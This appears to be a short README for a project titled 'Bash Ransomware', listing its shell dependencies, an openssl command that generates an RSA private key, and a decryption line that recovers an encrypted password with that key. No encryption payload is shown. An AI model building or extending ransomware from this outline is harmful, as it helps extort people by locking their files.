# Bash Ransomware
Meant to be quick and dirty and portable to linux and BSD (solaris?)
Requires the following dependancies:
```
which
cut
mv
openssl
chmod
chflags
```
awk
openssl genrsa -out priv.key 2048
DECRYPT openssl base64 -d -in password.enc | openssl rsautl -decrypt -inkey rsa.key 
